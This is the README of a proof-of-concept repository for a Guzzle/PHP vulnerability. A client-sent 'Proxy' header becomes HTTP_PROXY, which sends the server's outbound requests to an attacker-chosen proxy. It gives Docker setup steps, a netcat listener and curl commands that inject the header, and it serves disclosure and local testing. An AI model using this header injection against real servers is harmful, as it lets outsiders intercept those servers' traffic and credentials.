# Guzzle FPM Proxy Vulnerability

Some command-line HTTP clients support a set of environment variables to configure a proxy. These
are of the form `<protocol>_PROXY`; `HTTP_PROXY` is particularly noteworthy.

Separately, PHP takes user-supplied headers, and sets them as `HTTP_*` in the `$_SERVER` autoglobal.

## Steps

This is how the vulnerability works:

1. Do the usual PHP thing of exposing user-supplied headers as `$_SERVER['HTTP_*']`
2. Be using Guzzle from FPM or Apache (haven't tested with other SAPIs, assume some others possibly vulnerable too)
3. As an HTTP client, inject a `Proxy: my-malicious-service` header to any request made
4. Watch as Guzzle helpfully sends the request to the malicious proxy, supplied by the client

## Using this repo

Here is how you can see it in action:

1. Clean up running instances from the last run:

    ```sh
    docker stop fpm-test-instance > /dev/null 2>&1
    docker rm   fpm-test-instance > /dev/null 2>&1
    ```

2. Start a new test instance of the vulnerable script:

    ```sh
    docker build -t fpm-guzzle-proxy .
    docker run -d -p 80:80 --name fpm-test-instance fpm-guzzle-proxy
    ```

3. Start some sort of capturing proxy, to test whether the request comes through. Note that things interpreting HTTP_PROXY
    don't seem to care about the path portion of the URL (so, requestb.in won't work). I have had success with `ngrok tcp 9999`,
    but it requires a paid account. Another one that works well for local testing is:

    `nc -l 12345`

4. Then, fire a request at your vulnerable script, and watch the data arrive at the user-specified proxy:

    ```sh
    curl -H 'Proxy: 0.tcp.ngrok.io:12345' 127.0.0.1
    ```

    or

    ```sh
    curl -H 'Proxy: 172.17.0.1:12345' 127.0.0.1
    ```

    etc.

# Version

## Apache

```
# apachectl -v
Server version: Apache/2.4.10 (Debian)
Server built:   Nov 28 2015 14:05:48
```

## PHP

```
# php -v
PHP 7.0.8 (cli) (built: Jul 14 2016 00:36:26) ( NTS )
Copyright (c) 1997-2016 The PHP Group
Zend Engine v3.0.0, Copyright (c) 1998-2016 Zend Technologies
```

## Guzzle

```
## 6.2.0 - 2016-03-21

* Feature: added `GuzzleHttp\json_encode` and `GuzzleHttp\json_decode`.
  https://github.com/guzzle/guzzle/pull/1389
* Bug fix: Fix sleep calculation when waiting for delayed requests.
  https://github.com/guzzle/guzzle/pull/1324
* Feature: More flexible history containers.
  https://github.com/guzzle/guzzle/pull/1373
* Bug fix: defer sink stream opening in StreamHandler.
  https://github.com/guzzle/guzzle/pull/1377
* Bug fix: do not attempt to escape cookie values.
  https://github.com/guzzle/guzzle/pull/1406
* Feature: report original content encoding and length on decoded responses.
  https://github.com/guzzle/guzzle/pull/1409
* Bug fix: rewind seekable request bodies before dispatching to cURL.
  https://github.com/guzzle/guzzle/pull/1422
* Bug fix: provide an empty string to `http_build_query` for HHVM workaround.
  https://github.com/guzzle/guzzle/pull/1367
```
